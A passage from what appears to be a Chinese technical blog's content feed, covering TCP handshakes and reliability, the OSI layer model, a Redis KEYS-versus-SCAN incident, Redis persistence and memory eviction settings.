ACK)，这里后边会讲到。</p><h4 id="Acknowledgment-Numbe"><a href="#Acknowledgment-Numbe" class="headerlink" title="Acknowledgment Numbe"></a>Acknowledgment Numbe</h4><p>称为「确认序列号」。确认序列号是接收确认端所期望收到的下一序列号。确认序号应当是上次已成功收到数据字节序号加1，只有当标志位中的 ACK 标志为 1 时该确认序列号的字段才有效。主要用来解决不丢包的问题。<br>若确认号=N，则表明：到序号N-1为止的所有数据都已正确收到。<br>在这里，现在我们只需知道它的作用是什么，就是在数据传输的时候是一段一段的，都是由序列号进行标识的，所以说，接收端每接收一段，之后就想要的下一段的序列号就称为「确认序列号」。</p><h4 id="TCP-Flag"><a href="#TCP-Flag" class="headerlink" title="TCP Flag"></a>TCP Flag</h4><p>TCP 首部中有 6 个标志比特，它们中的多个可同时被设置为 1，主要是用于操控 TCP 的状态机的，依次为URG，ACK，PSH，RST，SYN，FIN。</p><ol><li>ACK<br>这个标识可以理解为发送端发送数据到接收端，发送的时候 ACK 为 0，标识接收端还未应答，一旦接收端接收数据之后，就将 ACK 置为 1，发送端接收到之后，就知道了接收端已经接收了数据。<br>此标志表示「应答域有效」，就是说前面所说的TCP应答号将会包含在 TCP 数据包中；有两个取值：0 和 1，为 1 的时候表示应答域有效，反之为 0；</li><li>SYN<br>表示「同步序列号」，是 TCP 握手的发送的第一个数据包<br>用来建立 TCP 的连接。SYN 标志位和 ACK 标志位搭配使用，当连接请求的时候，SYN=1，ACK=0连接被响应的时候，SYN=1，ACK=1；这个标志的数据包经常被用来进行端口扫描。扫描者发送一个只有 SYN 的数据包，如果对方主机响应了一个数据包回来 ，就表明这台主机存在这个端口。</li><li>FIN<br>表示发送端已经达到数据末尾，也就是说双方的数据传送完成，没有数据可以传送了，发送FIN标志位的 TCP 数据包后，连接将被断开。这个标志的数据包也经常被用于进行端口扫描。<br>这个很好理解，就是说，发送端只剩最后的一段数据了，同时要告诉接收端后边没有数据可以接受了，所以用FIN标识一下，接收端看到这个FIN之后，哦！这是接受的最后的数据，接受完就关闭了。<h4 id="Window-size"><a href="#Window-size" class="headerlink" title="Window size"></a>Window size</h4>称为滑动窗口大小。所说的滑动窗口，用来进行流量控制。</li></ol><h3 id="三次握手与四次挥手"><a href="#三次握手与四次挥手" class="headerlink" title="三次握手与四次挥手"></a>三次握手与四次挥手</h3><h4 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h4><blockquote><p>我要和你建立链接，你真的要和我建立链接么，我真的要和你建立链接，成功</p></blockquote><p>初始状态：客户端处于closed(关闭) 状态，服务器处于listen(监听) 状态。</p><p>第一次握手：Client将标志位SYN置为1，随机产生一个值seq=J，并将该数据包发送给Server，Client进入SYN_SENT状态，等待Server确认。</p><p>第二次握手：Server收到数据包后由标志位SYN=1知道Client请求建立连接，Server将标志位SYN（服务端）和ACK（服务端）都置为1，ack=J(seq)+1(ACK=1)，随机产生一个值seq=K，并将该数据包发送给Client以确认连接请求，Server进入SYN_RCVD状态。</p><p>第三次握手：Client收到确认后，检查ack是否为J+1，ACK（服务端）是否为1，如果正确则将标志位ACK（客户端）置为1，ack=K+1，并将该数据包发送给Server，Server检查ack是否为K+1，ACK是否为1，如果正确则连接建立成功，Client和Server进入ESTABLISHED状态，完成三次握手，随后Client与Server之间可以开始传输数据了。</p><p><img src="%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%981.png" alt=""></p><h4 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h4><blockquote><p>我要和你断开链接；好的，断吧。我也要和你断开链接；好的，断吧）</p></blockquote><p>第一次挥手：Client发送一个FIN，用来关闭Client到Server的数据传送，Client进入FIN_WAIT_1状态。</p><p>第二次挥手：Server收到FIN后，发送一个ACK给Client，确认序号为收到序号+1（与SYN相同，一个FIN占用一个序号），Server进入CLOSE_WAIT状态。此时TCP链接处于半关闭状态，即客户端已经没有要发送的数据了，但服务端若发送数据，则客户端仍要接收。</p><p>第三次挥手：Server发送一个FIN，用来关闭Server到Client的数据传送，Server进入LAST_ACK状态。</p><p>第四次挥手：Client收到FIN后，Client进入TIME_WAIT状态，接着发送一个ACK给Server，确认序号为收到序号+1，Server进入CLOSED状态，完成四次挥手。</p><p><img src="%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%982.png" alt=""></p><h4 id="综合理解"><a href="#综合理解" class="headerlink" title="综合理解"></a>综合理解</h4><p><img src="%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%983.png" alt=""></p><h4 id="为什么-TCP-链接需要三次握手，两次不可以么"><a href="#为什么-TCP-链接需要三次握手，两次不可以么" class="headerlink" title="为什么 TCP 链接需要三次握手，两次不可以么"></a>为什么 TCP 链接需要三次握手，两次不可以么</h4><blockquote><p>“三次握手” 的目的是为了防止已失效的链接请求报文突然又传送到了服务端，因而产生错误。</p></blockquote><p>正常的情况：A 发出连接请求，但因连接请求报文丢失而未收到确认，于是 A 再重传一次连接请求。后来收到了确认，建立了连接。数据传输完毕后，就释放了连接。A 共发送了两个连接请求报文段，其中第一个丢失，第二个到达了 B。没有 “已失效的连接请求报文段”。</p><p>现假定出现了一种异常情况：即 A 发出的第一个连接请求报文段并没有丢失，而是在某个网络结点长时间的滞留了，以致延误到连接释放以后的某个时间才到达 B。本来这是一个早已失效的报文段。但 B 收到此失效的连接请求报文段后，就误认为是 A 再次发出的一个新的连接请求。于是就向 A 发出确认报文段，同意建立连接。</p><p>假设不采用“三次握手”，那么只要 B 发出确认，新的连接就建立了。由于现在 A 并没有发出建立连接的请求，因此不会理睬 B 的确认，也不会向 B 发送数据。但 B 却以为新的运输连接已经建立，并一直等待 A 发来数据。这样，B 的很多资源就白白浪费掉了。采用“三次握手”的办法可以防止上述现象发生。</p><h4 id="为什么要四次挥手？"><a href="#为什么要四次挥手？" class="headerlink" title="为什么要四次挥手？"></a>为什么要四次挥手？</h4><p>TCP 协议是一种面向连接的、可靠的、基于字节流的运输层通信协议。TCP 是全双工模式，这就意味着，当 A 向 B 发出 FIN 报文段时，只是表示 A 已经没有数据要发送了，而此时 A 还是能够接受到来自 B 发出的数据；B 向 A 发出 ACK 报文段也只是告诉 A ，它自己知道 A 没有数据要发了，但 B 还是能够向 A 发送数据。所以想要愉快的结束这次对话就需要四次挥手。</p><h2 id="TCP-协议如何来保证传输的可靠性"><a href="#TCP-协议如何来保证传输的可靠性" class="headerlink" title="TCP 协议如何来保证传输的可靠性"></a>TCP 协议如何来保证传输的可靠性</h2><p>TCP 提供一种面向连接的、可靠的字节流服务。其中，面向连接意味着两个使用 TCP 的应用（通常是一个客户和一个服务器）在彼此交换数据之前必须先建立一个 TCP 连接。在一个 TCP 连接中，仅有两方进行彼此通信；而字节流服务意味着两个应用程序通过 TCP 链接交换 8 bit 字节构成的字节流，TCP 不在字节流中插入记录标识符。</p><p>对于可靠性，TCP通过以下方式进行保证：</p><ol><li>数据包校验：目的是检测数据在传输过程中的任何变化，若校验出包有错，则丢弃报文段并且不给出响应，这时TCP发送数据端超时后会重发数据；</li><li>对失序数据包重排序：既然TCP报文段作为IP数据报来传输，而IP数据报的到达可能会失序，因此TCP报文段的到达也可能会失序。TCP将对失序数据进行重新排序，然后才交给应用层；</li><li>丢弃重复数据：对于重复数据，能够丢弃重复数据；</li><li>应答机制：当TCP收到发自TCP连接另一端的数据，它将发送一个确认。这个确认不是立即发送，通常将推迟几分之一秒；</li><li>超时重发：当TCP发出一个段后，它启动一个定时器，等待目的端确认收到这个报文段。如果不能及时收到一个确认，将重发这个报文段；</li><li>流量控制：TCP连接的每一方都有固定大小的缓冲空间。TCP的接收端只允许另一端发送接收端缓冲区所能接纳的数据，这可以防止较快主机致使较慢主机的缓冲区溢出，这就是流量控制。TCP使用的流量控制协议是可变大小的滑动窗口协议。</li></ol>]]></content>
      
      
      <categories>
          
          <category> Internet </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Open System Interconnection Introduction</title>
      <link href="/2019/05/19/Open-System-Interconnection-Introduction/"/>
      <url>/2019/05/19/Open-System-Interconnection-Introduction/</url>
      
        <content type="html"><![CDATA[<h2 id="OSI-网络体系结构与-TCP-IP-协议模型"><a href="#OSI-网络体系结构与-TCP-IP-协议模型" class="headerlink" title="OSI 网络体系结构与 TCP/IP 协议模型"></a>OSI 网络体系结构与 TCP/IP 协议模型</h2><blockquote><p>OSI 是一个理论上的网络通信模型，而 TCP/IP 则是实际上的网络通信标准。但是，它们的初衷是一样的，都是为了使得两台计算机能够像两个知心朋友那样能够互相准确理解对方的意思并做出优雅的回应。<br>分层划分的结构，既能规定不同层完成的功能，又能实现层与层之间的改动而不相互影响。<br>起初网络分层是标准的七层，也就是 OSI 七层模型。之后又诞生了 TCP/IP 五层模型。</p></blockquote><p><img src="%E7%BD%91%E7%BB%9C%E5%88%86%E5%B1%82%E6%A8%A1%E5%9E%8B_1.png" alt=""><br><img src="%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%988.png" alt=""></p><h3 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h3><p>参考模型的最低层，也是OSI模型的第一层，实现了相邻计算机节点之间比特流的透明传送，并尽可能地屏蔽掉具体传输介质和物理设备的差异，使其上层(数据链路层)不必关心网络的具体传输介质。</p><h3 id="数据链路层-data-link-layer"><a href="#数据链路层-data-link-layer" class="headerlink" title="数据链路层 data link layer"></a>数据链路层 data link layer</h3><p>接收来自物理层的位流形式的数据，并封装成帧，传送到上一层；同样，也将来自上层的数据帧，拆装为位流形式的数据转发到物理层。这一层在物理层提供的比特流的基础上，通过差错控制、流量控制方法，使有差错的物理线路变为无差错的数据链路，即提供可靠的通过物理介质传输数据的方法。</p><h4 id="以太网协议"><a href="#以太网协议" class="headerlink" title="以太网协议"></a>以太网协议</h4><blockquote><p>以太网规定，每组的电信号就是一个数据包，每个数据包我们可以称为“帧”。每帧的组成是由标头(Head)和数据(Data)组成。</p></blockquote><h5 id="标头"><a href="#标头" class="headerlink" title="标头"></a>标头</h5><p>用于供接收端判断该帧是否是发送给自己的。<br>数据包的标头中通常会存放一些有关数据包的说明、发送者是谁、接受者又是谁等相关识别信息。<br>标头的长度固定为 18 字节，也就是说，一些标头识别信息的大小不能超过 18 字节。</p><h5 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h5><p>是整个数据包的具体内容，比如文件、字符串之类的。<br>数据部分的长度最小至少为 46 个字节，最长 1500 字节。我们可能会想到，如果小于 46 字节没啥问题可以存放开，那么大于 1500 字节怎么处理呢？很简单，我们就分成两个包处理（分割），两个包存放不下就分割成三个包。</p><h4 id="广播"><a href="#广播" class="headerlink" title="广播"></a>广播</h4><p>广播的作用就是用来查找接收端的 MAC 地址，从而进行下一步的数据传输。注意，广播只是一种发送数据的形式，而计算机想要知道另一台计算机的 MAC 地址是通过 ARP 协议解决的。<br>稍微屡一下，我们想要发送数据，首先要知道对方的唯一标识（MAC 地址），要想知道对方的 MAC 地址，需要使用 ARP 协议，假设我们通过 ARP 协议拿到了接收方的 MAC 地址。<br>我们开始发送数据，将发送方的 MAC 地址和接收方的 MAC 地址封装在数据包中，然后发送端向同一子网络中（同一局域网）中的所有计算机发送该数据包，所有的计算机接收到该包之后，就对数据包的头部进行提取，提取出里边封装好的接收端 MAC 地址和自己的 MAC 地址作比对，如果相同，就说明该数据包是给自己发送的，否则，就会丢弃该数据包，这个过程就是广播的过程。<br>如果不在同一局域网中我们怎么处理？我们平常使用无线网都知道每个无线局域网都会有一个路由器，我们先通过以上的方法将数据发送到路由器，然后路由器转发数据到其他局域网中的计算机。</p><h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h3><p>将网络地址翻译成对应的物理地址，并通过路由选择算法为分组通过通信子网选择最适当的路径。<br><img src="%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%989.png" alt=""></p><h4 id="IP协议与子网掩码"><a href="#IP协议与子网掩码" class="headerlink" title="IP协议与子网掩码"></a>IP协议与子网掩码</h4><blockquote><p>网络层中最重要的一个协议就是 IP 协议，我们一般发送端给服务端发送数据同时要知道两个地址才能准确送达到对方，分别为 IP 地址和 MAC 地址。</p></blockquote><p>IP 的数据包是直接放入到以太网数据包的“数据”部分的，这样做有一个好处就是“上层的变动完全涉及不到下层的结构”。然后数据包就变成这个样子了。<br><img src="%E7%BD%91%E7%BB%9C%E5%88%86%E5%B1%82%E6%A8%A1%E5%9E%8B_2.png" alt=""></p><p>IP 数据包也分为标头(Head)和数据(Data)两部分。</p><ol><li>标头<br>IP 数据包的标头是 20 ~ 60 字节，主要包括版本、IP 地址等信息。</li><li>数据<br>数据的最大长度为 65515 字节。整个 IP 数据包的最大总长度为 65535 字节。主要存放 IP 数据包的具体内容。</li></ol><p>问题来了，以太网的数据部分最长为 1500 字节，你把一个长度为 65535 字节的 IP 数据包放到以太网的数据包汇总，不会被撑破吗？你在逗我么？确实是呀，那我们就分割数据包吧，分割成几个以太网数据包分开发送。</p><p>将 IP 地址抽象成一种逻辑上的地址，也就是说 MAC 地址是物理上的地址，就是定死了。而IP 地址是动态分配的，不是固定死的。<br>我们就是通过 IP 地址来判断两个计算机设备是否在同一子网络中的，具体利用子网掩码。<br>IP 地址是由 32 个二进制位组成的，也就是四个十进制（如：255.255.255.000）。<br>子网掩码也是由 32 个二进制位组成的，但是只能用 0 或 1 来表示，如11111111.11111111.11111111.00000000。</p><p>有 1 的部分表示网络部分，有 0 表示主机部分，两台计算机的 IP 地址分别和子网掩码进行一种运算（AND 运算），如果结果相同，两台计算机就在同一局域网中，否则就不在同一局域网中。</p><h4 id="ARP-协议"><a href="#ARP-协议" class="headerlink" title="ARP 协议"></a>ARP 协议</h4><blockquote><p>前提：对方的 IP 地址是已知的，通过 DNS 解析得到。</p></blockquote><p>ARP 协议发出一个数据包，包含在以太网的数据包中（其中包含对方的 IP 地址，对方的 MAC 地址栏是 FF:FF:FF:FF:FF:FF）。子网络中的每台主机都会收到这个包，然后从中取出 IP 地址与自身对比，如果两者相同，都做出回复，向对方报告自己的 MAC 地址，否则就丢弃这个包。</p><h3 id="传输层-transport-layer"><a href="#传输层-transport-layer" class="headerlink" title="传输层 transport layer"></a>传输层 transport layer</h3><p>传输层的主要功能就是为了能够实现“端口到端口”的通信。计算机上运行的不同程序都会分配不同的端口，所以才能使得数据能够正确的传送给不同的应用程序。<br>在源端与目的端之间提供可靠的透明数据传输，使上层服务用户不必关系通信子网的实现细节。在协议栈中，传输层位于网络层之上，传输层协议为不同主机上运行的进程提供逻辑通信，而网络层协议为不同主机提供逻辑通信，如下图所示。<br><img src="%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%9810.png" alt=""><br>实际上，网络层可以看作是传输层的一部分，其为传输层提供服务。但对于终端系统而言，网络层对它们而言是透明的，它们只知道传输层的存在，也就是说，在逻辑上它们认为是传输层为它们提供了端对端的通信，这也是分层思想的妙处。</p><h4 id="UDP协议"><a href="#UDP协议" class="headerlink" title="UDP协议"></a>UDP协议</h4><p>加入端口号也需要一套规则，那就是 UDP 协议，但是 UDP 协议有个缺点，一旦进行通信，就不知道对方是否接收到数据了，我们再定义一套规则，让其可以和对方进行确认，那么 TCP 出现了。</p><p>UDP 协议也分为标头(Head)和数据(Data)两部分。</p><ol><li>标头<br>标头的长度为 8 字节。主要存放了发送和接收端口号。</li><li>数据<br>数据部分和标头部分的总长度不超过 65535 字节，正好放进一个IP数据包。</li></ol><p>前边也讲过，数据包之间是包含关系的，所以 UDP 的数据包是放到 IP 数据包的“数据”部分的，IP 数据包又放在以太网数据包的“数据”部分的。</p><p><img src="%E7%BD%91%E7%BB%9C%E5%88%86%E5%B1%82%E6%A8%A1%E5%9E%8B_3.png" alt=""></p><h4 id="TCP-协议"><a href="#TCP-协议" class="headerlink" title="TCP 协议"></a>TCP 协议</h4><p>我们通常说 TCP 三次握手和四次挥手，这就是传输层中完成的。<br>TCP 的数据包和 UDP 相同嵌入在 IP 协议的“数据”部分，TCP 并没有长度限制，但是为了保证传输效率，肯定要进行限制的，TCP 的数据包的长度一般不会超过 IP 数据包的长度了，保证单个的 TCP 数据包不再进行分割。</p><h3 id="会话层-Session-Layer"><a href="#会话层-Session-Layer" class="headerlink" title="会话层 Session Layer"></a>会话层 Session Layer</h3><p>会话层是OSI模型的第五层，是用户应用程序和网络之间的接口，负责在网络中的两节点之间建立、维持和终止通信。</p><h3 id="表示层-Presentation-Layer"><a href="#表示层-Presentation-Layer" class="headerlink" title="表示层 Presentation Layer"></a>表示层 Presentation Layer</h3><blockquote><p>数据的编码，压缩和解压缩，数据的加密和解密</p></blockquote><p>表示层是OSI模型的第六层，它对来自应用层的命令和数据进行解释，以确保一个系统的应用层所发送的信息可以被另一个系统的应用层读取。</p><h3 id="应用层-Application-layer"><a href="#应用层-Application-layer" class="headerlink" title="应用层 Application layer"></a>应用层 Application layer</h3><p>为用户的应用进程提供网络通信服务<br>应用层是最高一层，直接面向用户，它的数据包会放在 TCP 的数据包的“数据”部分，那么整个五层的数据包就会变成一下这样。</p><p><img src="%E7%BD%91%E7%BB%9C%E5%88%86%E5%B1%82%E6%A8%A1%E5%9E%8B_4.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Internet </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Avoid Accident of Redis</title>
      <link href="/2019/04/25/Avoid-Accident-of-Redis/"/>
      <url>/2019/04/25/Avoid-Accident-of-Redis/</url>
      
        <content type="html"><![CDATA[<h4 id="事故产生"><a href="#事故产生" class="headerlink" title="事故产生"></a>事故产生</h4><p>用户token缓存采用了【user_token:userid】格式的key，保存用户的token的值，运维为了帮助开发小伙伴们查一下线上现在有多少登录用户，直接用了 keys user_token* 方式进行查询，事故就此发生了。导致redis不可用，假死。</p><h4 id="分析原因"><a href="#分析原因" class="headerlink" title="分析原因"></a>分析原因</h4><p>我们线上的登录用户有几百万，数据量比较多；keys算法是遍历算法，复杂度是O(n)，也就是数据越多，时间复杂度越高。<br>数据量达到几百万，keys这个指令就会导致 Redis 服务卡顿，因为Redis 是单线程程序，顺序执行所有指令，其它指令必须等到当前的 keys 指令执行完了才可以继续。</p><h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>我们可以采用redis的另一个命令scan。我们看一下scan的特点</p><blockquote><p>1、复杂度虽然也是 O(n)，但是它是通过游标分步进行的，不会阻塞线程<br>2、提供 count 参数，不是结果数量，是redis单次遍历字典槽位数量(约等于)<br>3、同 keys 一样，它也提供模式匹配功能;<br>4、服务器不需要为游标保存状态，游标的唯一状态就是 scan 返回给客户端的游标整数;<br>5、返回的结果可能会有重复，需要客户端去重复，这点非常重要;<br>6、单次返回的结果是空的并不意味着遍历结束，而要看返回的游标值是否为零。</p></blockquote><h5 id="scan命令格式与解释"><a href="#scan命令格式与解释" class="headerlink" title="scan命令格式与解释"></a>scan命令格式与解释</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SCAN cursor [MATCH pattern] [COUNT count]</span><br><span class="line"></span><br><span class="line">scan 游标 MATCH &lt;返回和给定模式相匹配的元素&gt; count 每次迭代所返回的元素数量</span><br><span class="line">SCAN命令是增量的循环，每次调用只会返回一小部分的元素。所以不会让redis假死 SCAN命令返回的是一个游标，从0开始遍历，到0结束遍历</span><br></pre></td></tr></table></figure><h5 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">redis &gt; scan 0 match user_token* count 5</span><br><span class="line"> 1) &quot;6&quot;</span><br><span class="line"> 2) &quot;user_token:1000&quot;</span><br><span class="line"> 2) &quot;user_token:1001&quot;</span><br><span class="line"> 3) &quot;user_token:1010&quot;</span><br><span class="line"> 4) &quot;user_token:2300&quot;</span><br><span class="line"> 5) &quot;user_token:1389&quot;</span><br></pre></td></tr></table></figure><p>从0开始遍历，返回了游标6，又返回了数据，继续scan遍历，就要从6开始</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">redis &gt; scan 6 match user_token* count 5</span><br><span class="line"> 1) &quot;10&quot;</span><br><span class="line"> 2) 1) &quot;user_token:3100&quot;</span><br><span class="line"> 2) &quot;user_token:1201&quot;</span><br><span class="line"> 3) &quot;user_token:1410&quot;</span><br><span class="line"> 4) &quot;user_token:5300&quot;</span><br><span class="line"> 5) &quot;user_token:3389&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> NoSQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> BigData </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis Persistence</title>
      <link href="/2019/04/20/Redis-Persistence/"/>
      <url>/2019/04/20/Redis-Persistence/</url>
      
        <content type="html"><![CDATA[<h2 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h2><blockquote><p>持久化：将内存中的数据存储到硬盘中</p></blockquote><h3 id="RDB方式"><a href="#RDB方式" class="headerlink" title="RDB方式"></a>RDB方式</h3><blockquote><p>在指定的时间间隔内，将内存中的数据集写入到磁盘上。</p></blockquote><h4 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h4><p>整个文件库只包含一个文件，对于文件备份很好；对性能损耗小。</p><h4 id="劣势"><a href="#劣势" class="headerlink" title="劣势"></a>劣势</h4><p>有可能数据没来得及备份系统就宕机了，当数据集非常大时，很有可能导致系统停止工作几百毫秒甚至1秒</p><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><blockquote><p>在redis的配置文件redis.conf中的 <strong>SNAPSHOTTING</strong></p></blockquote><p>常用配置项：</p><ol><li><strong>save [seconds] [key nums]：</strong> 每seconds秒若有keynums次key value的变化，则完成一次持久化</li><li><strong>stop-writes-on-bgsave-error：</strong> 默认值为yes。当启用了RDB且最后一次后台保存数据失败，Redis是否停止接收数据。这会让用户意识到数据没有正确持久化到磁盘上，否则没有人会注意到灾难（disaster）发生了。如果Redis重启了，那么又可以重新开始接收数据了。</li><li><strong>rdbcompression：</strong> 默认值是yes。对于存储到磁盘中的快照，可以设置是否进行压缩存储。如果是的话，redis会采用LZF算法进行压缩。如果你不想消耗CPU来进行压缩的话，可以设置为关闭此功能，但是存储在磁盘上的快照会比较大。</li><li><strong>rdbchecksum：</strong> 默认值是yes。在存储快照后，我们还可以让redis使用CRC64算法来进行数据校验，但是这样做会增加大约10%的性能消耗，如果希望获取到最大的性能提升，可以关闭此功能。</li><li><strong>dbfilename [filename]</strong> 备份名，默认dump.rdb</li><li><strong>dir ./</strong> 保存路径</li></ol><h3 id="AOF方式"><a href="#AOF方式" class="headerlink" title="AOF方式"></a>AOF方式</h3><blockquote><p>用日志的形式记录服务器所处理的每一个操作。</p></blockquote><h4 id="优势-1"><a href="#优势-1" class="headerlink" title="优势"></a>优势</h4><p>可以带来更高的数据安全性，日志写入过程中如果出现宕机情况也不会破坏掉日志文件本身。</p><h4 id="劣势-1"><a href="#劣势-1" class="headerlink" title="劣势"></a>劣势</h4><p>效率最低。</p><h4 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h4><blockquote><p>在redis的配置文件redis.conf中的 <strong>APPEND ONLY MODE</strong></p></blockquote><p>常用配置项：</p><ol><li>appendonly no→yes</li><li>appendfilename “appendonly.aof”</li><li>appendfsync always（每修改一次就同步）/everysec（每秒同步一次）/no（不同步）</li></ol><p>eg.比如不小心flushall了，你只需要找到appendonly.aof日志文件，把最后一行flushall删掉即可，数据就回来了。</p><h2 id="无持久化"><a href="#无持久化" class="headerlink" title="无持久化"></a>无持久化</h2><p>就是把redis当成一种缓存的机制了</p><h2 id="同时使用RDB和AOF"><a href="#同时使用RDB和AOF" class="headerlink" title="同时使用RDB和AOF"></a>同时使用RDB和AOF</h2>]]></content>
      
      
      <categories>
          
          <category> NoSQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis RAM</title>
      <link href="/2019/04/15/Redis-RAM/"/>
      <url>/2019/04/15/Redis-RAM/</url>
      
        <content type="html"><![CDATA[<h2 id="Redis占用内存大小"><a href="#Redis占用内存大小" class="headerlink" title="Redis占用内存大小"></a>Redis占用内存大小</h2><h3 id="通过配置文件配置"><a href="#通过配置文件配置" class="headerlink" title="通过配置文件配置"></a>通过配置文件配置</h3><p>通过在Redis安装目录下面的redis.conf配置文件中添加以下配置设置内存大小</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;设置Redis最大占用内存大小为100M</span><br><span class="line">maxmemory 100mb</span><br></pre></td></tr></table></figure><blockquote><p>redis的配置文件不一定使用的是安装目录下面的redis.conf文件，启动redis服务的时候是可以传一个参数指定redis的配置文件的</p></blockquote><h3 id="通过命令修改"><a href="#通过命令修改" class="headerlink" title="通过命令修改"></a>通过命令修改</h3><p>Redis支持运行时通过命令动态修改内存大小</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;设置Redis最大占用内存大小为100M</span><br><span class="line">127.0.0.1:6379&gt; config set maxmemory 100mb</span><br><span class="line">&#x2F;&#x2F;获取设置的Redis能使用的最大内存大小</span><br><span class="line">127.0.0.1:6379&gt; config get maxmemory</span><br></pre></td></tr></table></figure><blockquote><p>如果不设置最大内存大小或者设置最大内存大小为0，在64位操作系统下不限制内存大小，在32位操作系统下最多使用3GB内存</p></blockquote><h2 id="Redis的内存淘汰"><a href="#Redis的内存淘汰" class="headerlink" title="Redis的内存淘汰"></a>Redis的内存淘汰</h2><p>内存用完的时候，Redis定义了几种策略用来处理继续往里添加数据的情况：</p><h3 id="六种策略"><a href="#六种策略" class="headerlink" title="六种策略"></a>六种策略</h3><ol><li>noeviction(默认策略)：对于写请求不再提供服务，直接返回错误（DEL请求和部分特殊请求除外）</li><li>allkeys-lru：从所有key中使用LRU算法进行淘汰</li><li>volatile-lru：从设置了过期时间的key中使用LRU算法进行淘汰</li><li>allkeys-random：从所有key中随机淘汰数据</li><li>volatile-random：从设置了过期时间的key中随机淘汰</li><li>volatile-ttl：在设置了过期时间的key中，根据key的过期时间进行淘汰，越早过期的越优先被淘汰</li></ol><p>当使用volatile-lru、volatile-random、volatile-ttl这三种策略时，如果没有key可以被淘汰，则和noeviction一样返回错误。</p><h3 id="获取及设置内存淘汰策略"><a href="#获取及设置内存淘汰策略" class="headerlink" title="获取及设置内存淘汰策略"></a>获取及设置内存淘汰策略</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">获取当前内存淘汰策略：</span><br><span class="line">127.0.0.1:6379&gt; config get maxmemory-policy</span><br><span class="line"></span><br><span class="line">通过配置文件设置淘汰策略（修改redis.conf文件）：</span><br><span class="line">maxmemory-policy allkeys-lru</span><br><span class="line"></span><br><span class="line">通过命令修改淘汰策略：</span><br><span class="line">127.0.0.1:6379&gt; config set maxmemory-policy allkeys-lru</span><br></pre></td></tr></table></figure><h2 id="LRU算法"><a href="#LRU算法" class="headerlink" title="LRU算法"></a>LRU算法</h2><blockquote><p>LRU(Least Recently Used)，即最近最少使用，是一种缓存置换算法。在使用内存作为缓存的时候，缓存的大小一般是固定的。当缓存被占满，这个时候继续往缓存里面添加数据，就需要淘汰一部分老的数据，释放内存空间用来存储新的数据。这个时候就可以使用LRU算法了。其核心思想是：如果一个数据在最近一段时间没有被用到，那么将来被使用到的可能性也很小，所以就可以被淘汰掉。</p></blockquote><h3 id="使用java实现一个简单的LRU算法"><a href="#使用java实现一个简单的LRU算法" class="headerlink" title="使用java实现一个简单的LRU算法"></a>使用java实现一个简单的LRU算法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 